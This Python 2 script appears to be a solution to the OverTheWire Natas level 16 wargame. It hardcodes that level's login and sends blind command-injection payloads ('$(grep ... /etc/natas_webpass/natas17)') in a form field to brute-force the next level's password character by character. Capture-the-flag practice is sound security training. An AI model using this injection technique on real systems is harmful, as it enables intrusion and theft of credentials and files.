#!/usr/bin/python

import requests
from string import *

username = "natas16"
password = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"

letter = lowercase + uppercase + digits
let = ""
pas = ""

url = "http://natas16.natas.labs.overthewire.org"

for c in letter:
	req = requests.post(url, data = {'needle' : "hellos$(grep " + c  + " /etc/natas_webpass/natas17)"} , auth = (username, password))

	if "hellos" not in req.text:
		let += c
		print let


while(True):

	for c in let:
		req = requests.post(url, data = {'needle' : "hellos$(grep ^" + pas + c + " /etc/natas_webpass/natas17)"} , auth = (username, password))

		if("hellos" not in req.text):
			pas += c

	print pas

